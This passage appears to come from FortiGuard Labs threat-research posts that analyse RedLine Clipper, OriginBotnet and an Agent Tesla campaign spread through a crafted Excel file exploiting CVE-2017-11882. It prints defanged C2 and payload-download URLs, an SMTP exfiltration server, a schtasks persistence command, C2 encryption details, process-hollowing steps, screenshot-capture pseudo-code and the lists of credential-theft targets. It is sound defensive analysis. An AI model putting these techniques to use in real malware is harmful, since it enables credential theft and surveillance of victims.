addresses adhere to specific formats, but due to their complexity, users often copy and paste them during transactions. Consequently, if the wallet address is tampered with at this stage, users intending to send funds to a particular wallet may inadvertently deposit them into the attacker's wallet instead. To carry out this operation, RedLine Clipper utilizes the “OnClipboardChangeEventHandler” to regularly monitor clipboard changes and verify if the copied string conforms to the regular expression depicted in Figure 18. It's worth noting that the attacker targets all six supported cryptocurrencies in this scheme. The second file, an Agent Tesla variant, is stored as “COPPER.exe” (SHA256: c241e3b5d389b227484a8baec303e6c3e262d7f7bf7909e36e312dea9fb82798). This malware can log keystrokes, access the host's clipboard, and conduct disk scans to uncover credentials and other valuable data. Further, it can transmit gathered information to its Command and Control (C2) server through various communication channels, including HTTP(S), SMTP, FTP, or even dispatching it to a designated Telegram channel. To ensure its persistence, the malware replicates itself to the location “%AppData%\\EbJgI\\EbJgI.exe” and establishes itself as an auto-run entry within the system registry, as shown in Figure 20. Additionally, it compiles a list of specific software installed on the victim's device, including web browsers, email clients, FTP clients, and more, as shown in Figure 21. This specific version of Agent Tesla employs SMTP as its C2 connection protocol. You can see the details of the traffic session in Figure 22. The third file, OriginBotnet, is stored as “david.exe” (SHA256: be915d601276635bf4e77ce6b84feeec254a900c0d0c229b0d00f2c0bca1bec7). It is named after its namespace, as seen in Figure 23. OriginBotnet has a range of capabilities, including collecting sensitive data, establishing communications with its C2 server, and downloading additional files from the server to execute keylogging or password recovery functions on compromised devices. Initially, OriginBotnet scans running processes to determine if it is already active within the environment. It then initializes its settings and gathers essential information about the victim’s device, such as the installed AntiVirus Product, CPU, GPU, country, OS name, and username, as shown in Figure 25. Once the system information has been collected, the malware connects with the C2 server at https://nitrosoftwares[.]shop/gate. Figure 26 shows the function responsible for transmitting messages. The communication is conducted via a POST request using a parameter named “p.” The POST data is subjected to TripleDES encryption (in ECB mode, with PKCS7 padding) and subsequently encoded in Base64 format. The encryption key for TripleDES is stored within the “x-key” field of the HTTP Header. Additionally, the Content-Type and User-Agent values are hard-coded as “application/x-www-form-urlencoded” and “Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0,” respectively. Figures 27 and 28 provide insights into the traffic capture and decrypted message. After receiving an “OK” signal from the C2 server, OriginBotnet enters a waiting state and proceeds to parse incoming C2 commands. The process for handling these commands is outlined in Figure 28. The available commands include “downloadexecute,” “uninstall,” “update,” and “load.” If the victim receives either the “downloadexecute” or “update” command, the malware proceeds to parse additional parameters, including the URL. It then directly downloads supplementary files from the specified URL and executes them. It selects the appropriate execution method depending on the file’s extension (.exe, .msi, or .java). This may involve using “Process.Start” or invoking commands such as “msiexec.exe /I” or “java.exe -jar,” as shown in Figure 30. When receiving an “uninstall” command, OriginBotnet invokes “MoveFile” to relocate the file to a temporary folder. The final command, “load,” retrieves plugins from the C2 server. The POST session and the decoded data for this specific request are displayed in Figure 31. In this context, two plugins are available for OriginBotnet: Keylogger and PasswordRecovery. The plugin DLL file is transmitted as a Base64 encoded string within the “bytes” parameter. The processing function for this operation is shown in Figure 32. The Keylogger plugin (SHA256: c204f07873fafdfd48f37e7e659e3be1e4202c8f62db8c00866c8af40a9a82c5) is designed to covertly record and log each keystroke executed on a computer as well as monitor user activities. It employs techniques such as “SetWindowsHookEx” for capturing keyboard input events and “GetForegroundWindow” to determine the active window the user is working in. It also keeps tabs on clipboard text content through “SetClipboardViewer.” The stolen text file uses a format similar to Agent Tesla's, as shown in Figure 35. The PasswordRecovery plugin (SHA256: 56ced4e1abca685a871b77fab998766cbddfb3edf719311316082b6e05986d67) retrieves and organizes the credentials of various browser and software accounts. It records these results and reports them via HTTP POST requests. Its primary function is shown in Figure 36. The plugin is designed to target the following browsers and software applications: This cyberattack campaign uncovered by FortiGuard Labs involved a complex chain of events. It began with a malicious Word document distributed via phishing emails, leading victims to download a loader that executed a series of malware payloads. These payloads included RedLine Clipper, Agent Tesla, and OriginBotnet. The attack demonstrated sophisticated techniques to evade detection and maintain persistence on compromised systems.

    "title": "New Agent Tesla Variant Being Spread by Crafted Excel Document",
    "link": "https://www.fortinet.com/blog/threat-research/agent-tesla-variant-spread-by-crafted-excel-document",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from a victim’s computerSeverity level:Critical Our FortiGuard Labs captured a phishing campaign that spreads a new Agent Tesla variant. This well-known malware family uses a .Net-based Remote Access Trojan (RAT) and data stealer to gain initial access. It is often used for Malware-as-a-Service (MaaS). I performed an in-depth analysis of this campaign, from the initial phishing email to the actions of Agent Tesla installed on the victim’s machine to the collecting of sensitive information from the affected device. In this analysis, you will learn about the contents of this attack, such as how the phishing email starts the campaign, how the CVE-2017-11882/CVE-2018-0802 vulnerability (and not the VBS macro) is exploited to download and execute the Agent Tesla file on the victim’s device, as well as how Agent Tesla collects the sensitive data from the victim’s device, such as the credentials, key loggings, and screenshots of the victim’s screen. Despite fixes forCVE-2017-11882/CVE-2018-0802being released by Microsoft in November, 2017 and January, 2018, this vulnerability remains popular amongst threat actors, suggesting there are still unpatched devices in the wild, even after over five years. We are observing and mitigating3000 attacks per day, at the IPS level. The number of observed vulnerable devices isaround 1300per day. The phishing email is disguised as a Purchase Order notification, shown in Figure 1.1, that asks for the recipient to confirm an order from an industrial equipment supplier company. An Excel document is attached to this email called “Order 45232429.xls”. The attached Excel document is in OLE format. It contains crafted equation data that exploits the CVE-2017-11882/CVE-2018-0802 vulnerability to execute a malicious shellcode. Opening the attached Excel document displays a deceptive message to the user (Figure 2.1). Meanwhile, the shellcode inside the crafted equation data is secretly executed. CVE-2017-11882/CVE-2018-0802 is an RCE (remote code execution) vulnerability that results in memory corruption inside the EQNEDT32.EXE process when parsing the crafted equation data when exploited. This can lead to arbitrary code execution. Figure 2.2 shows the Excel document parsed in an OLE compound reader, where the equation data is inside the stream “\\x01Ole10NativE” under the storage folder “MBD0057E612”. Once the crafted Excel document is opened, the malicious equation data is parsed automatically by an MS Office process called “EQNEDT32.EXE.” This triggers the CVE-2017-11882/CVE-2018-0802 vulnerability, and the malicious shellcode inside the equation data is executed in the background. In Figure 2.3, we can see that the crafted equation data overrides the stack of the EQNEDT32.EXE and makes it jump twice (through the fixed addresses of 0x450650 and 0x44C329) to the shellcode at 0x33C006C (in the stack). After self-decryption, we observe that the shellcode’s main job is downloading and executing an additional malware file from the URL “hxxp://23[.]95.128.195/3355/chromium.exe”. To do this, it calls several APIs, such as URLDownloadToFileW(), to download the malware to a local folder, and ShellExecuteW() to run the malware on the victim’s device. In Figure 2.4, we can see that the shellcode is about to call the API URLDownloadToFileW() to download it into a local file and rename it as “dasHost.exe” under the “%TEMP%” folder. The downloaded file (“dasHost.exe”) is a .Net program protected by two packers, IntelliLock and .NET Reactor. Figure 3.1 displays the EntryPoint function of the downloaded file inside dnSpy, where the assembly name of the file is “Nvgqn7x”. As you may have noticed, all the names of the namespaces, classes, methods, and variables are thoroughly obfuscated. There are resource files inside the downloaded file’s .Net Resources section. The downloaded file (“dasHost.exe”) extracts two fileless execution modules from the .Net Resources section. One is the payload module of Agent Tesla, and the other is a Loader module to the payload file of Agent Tesla. Figure 3.2 shows all the resources in the .Net Resources section. According to my analysis, the resource \"rTMIRNhcvIYnT8lMa6.UJQcCvWAsvT8GV6hyn.resources\" is the encoded Loader module, whose assembly name is “Cassa.” The resource \"FinalProject.Resources\" is the encrypted and compressed Agent Tesla payload module, whose assembly name is “NyZELH bX.” It gets decrypted, decompressed, and loaded as a module in the “DeleteMC()” function of the Loader module, as shown in Figure 3.3. As you may have noticed, the resource is disguised as a Bitmap resource and is mixed up with the payload. Bitmap.GetPixel() and Color.FromArgb() are the two APIs being called to read the payload from the resource. It then goes through decryption and gzip decompression to restore the payload file, which is loaded as an executable module by calling the AppDomain.CurrentDomain.Load() method. Finally, the payload file’s “EntryPoint” function is invoked from the Loader module (“Cassa”). The payload module is a .Net program and is fully obfuscated. Fortunately, I managed to have it de-obfuscated using several analysis tools. As with most malware, the developers run the malware’s core module in a separate process. This is a common protection strategy to increase the malware's chance of survival on the victim's device. The primary function (other than persistence) of the payload is to perform the process hollowing and then place another decrypted executable file—sourced from a separate resource (called “7gQsJ0ugxz.resources”) within the payload file—onto the hollowed process and execute it. In this analysis, I call this decrypted executable file the core module of Agent Tesla. Figure 4.1 contains the key APIs the payload module invokes to perform the ProcessHollowing. It invokes CreateProcess() to create a suspended process of “dasHost.exe.” Next, it allocates memory in this process via the API VirtualAllocEx() for the core module. Then WriteProcessMemory() is invoked numerous times to copy the core module, saved in the array variable byte_1, onto the new process. It finally calls the APIs SetThreadContext() and ResumeThread() to restore the new process from a suspended state to execute the core module of Agent Tesla. After that, the payload module exits by calling Environment.Exit() in the Loader module’s DeleteMC() (refer to Figure 3.3). To persist in collecting the victim’s sensitive data, even if the affected system is restarted or the Agent Tesla process is killed, it does the following two things. It executes a command to create a task in the system TaskScheuler inside the payload module. The command in my analysis environment is \"C:\\Windows\\System32\\schtasks.exe\" /Create /TN \"Updates\\kCqKCO\" /XML \"C:\\Users\\Bobs\\AppData\\Local\\Temp\\tmp68E9.tmp,\" where \"Updates\\kCqKCO\" is the task name and \"/XML\" specifies it’s been created from an XML file that is provided by following a parameter (i.e. tmp68E9.tmp). Figure 5.1 shows the details of the XML content, where the file “C:\\Users\\Bobs\\AppData\\Roaming\\kCqKCO.exe” is a duplication of the downloaded “dasHost.exe.” The task is set to start at the victim’s logon. The core module adds an auto-run item in the system registry“C:\\Users\\Bobs\\AppData\\Roaming\\sOFvE\\sOFvE.exe” (shown in Figure 5.2). It is another duplication of “dasHost.exe” that is launched automatically at system startup. The Agent Tesla core module collects sensitive information from the victim’s device. This information includes the saved credentials of some software, the victim’s keylogging information, and screenshots of the victim’s device. It steals saved credentials from specified software installed on the victim’s device, including web browsers, email clients, FTP clients and more. Based on their features, the affected software can be categorized as below: \"Opera Browser\", \"Yandex Browser\", \"Iridium Browser\", \"Chromium\", \"7Star\", \"Torch Browser\", \"Cool Novo\", \"Kometa\", \"Amigo\", \"Brave\", \"CentBrowser\", \"Chedot\", \"Orbitum\", \"Sputnik\", \"Comodo Dragon\", \"Vivaldi\", \"Citrio\", \"360 Browser\", \"Uran\", \"Liebao Browser\", \"Elements Browser\", \"Epic Privacy\", \"Coccoc\", \"Sleipnir 6\", \"QIP Surf\", \"Coowon\", \"Chrome\", \"Flock Browser\", \"QQ Browser\", \"IE/Edge\", \"Safari\", \"UC Browser\", \"Falkon Browser\". \"Outlook\", \"ClawsMail\", \"IncrediMail\", \"FoxMail\", \"eM Client\", \"Opera Mail\", \"PocoMail\", \"Windows Mail App\", \"Mailbird\", \"The Bat!\", \"Becky!\", \"Eudora\". \"Flash FXP\", \"WS_FTP\", \"FTPGetter\", \"SmartFTP\", \"FTP Navigator\", \"FileZilla\", \"CoreFTP\", \"FtpCommander\", \"WinSCP\". \"NordVPN\", \"Private Internet Access\", \"OpenVPN\", \"Discord\", \"Trillian\", \"Psi/Psi+\". \"Mysql Workbench\", \"\\Microsoft\\Credentials\\\", \"Internet Download Manager\", \"JDownloader\". Agent Tesla calls the API SetWindowsHookEx() to set a keyboard hook to monitor low-level input events. In Figure 6.2, the callback hook procedure “this.EiqpViCm9()” is called whenever the victim is typing on their device. Agent Tesla records the program title, time, and victim’s keyboard input contents into a local file “%Temp%/log.tmp” from time to time. It also has a method called by a Timer every 20 minutes to check the “log.tmp” file and submit its content via SMTP. In the core module, Agent Tesla sets another Timer with a 20-minute interval to call another Timer function. This Timer function checks for any activity on the device and determines whether to record the screenshot and submit it. To do this, it calls the API GetLastInputInfo() to retrieve the time of the last input event received by the system and then compare it with the current time. The following pseudo-code snippet illustrates how Agent Tesla captures a screenshot. bitmap = newBitmap(bounds.Width, Screen.PrimaryScreen.Bounds.Height);encoderParameters = new EncoderParameters(1);encoder = 25Tl1j7fiou.KIOsJnSv3(ImageFormat.Jpeg);EncoderParameter encoderParameter = newEncoderParameter(Encoder.Quality, (long)Convert.ToInt32(60L));encoderParameters.Param[0] = encoderParameter;graphics = Graphics.FromImage(bitmap);graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);bitmap.Save(memoryStream, encoder, encoderParameters); The “memoryStream” variable saves the screenshot in jpeg format. Agent Tesla provides multiple ways to submit the stolen data, such as using the HTTP POST method or as the body of an email over SMTP. This variant chooses to submit the data collected from the victim’s device over email SMTP protocol. The SMTP server address and port hardcoded in the variant are \"mail.daymon.cc\" and 587. Figure 7.1 shows the malware about to call the smtpClient.Send() function to submit credentials data. The email subject starts with the keyword “PW_” followed by the User name/Computer name for credentials data. The email body is formatted in HTML. It is shown in Figure 7.2 when parsing the email body as HTML in a browser. The email’s subject is “KL_{User name/Computer name},” where KL is short for keylogger, and the email body is the collected keylogging data. As displayed in Figure 7.3, the email body includes the records of my keystrokes typed in a Notepad titled “Untitled - Notepad.” The captured screenshot is kept in a variable and added as an email attachment when submitted to the attacker. Figure 7.4 shows it about to add screenshot data to the email as an attachment. The email subject format for ScreenShots is “SC_{User name/Computer name},” and the email body is just the basic information about the victim’s device. The following flowchart roughly describes the outline of the malicious campaign. This analysis shows that a malicious Excel document attached to a phishing email exploits an aging security vulnerability to execute a shellcode that downloads Agent Tesla. It keeps relevant modules encrypted and encoded in the Resource section to protect its core module from being analyzed. I then explained how this variant establishes persistence on the victim’s device. I also showed the kind of software and data Agent Tesla is able to steal from the infected device, including credentials, keylogging data, and active screenshots. Lastly, I provided several examples of the kind of sensitive data this variant of Agent Tesla obtained from my analysis environment and how this stolen sensitive data is submitted to the attacker via emails over SMTP protocol. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, and AntiVirus services as follows: The downloading URLs are rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiMail has recognized the phishing email as SPAM. FortiGuard Antivirus service detects the attached Excel document and the downloaded file with AV signatures “MSExcel/CVE_2017_11882.EQMA!exploit” and “MSIL/AgentTesla.BEDA!tr”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious Equation data inside the Excel document. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks.
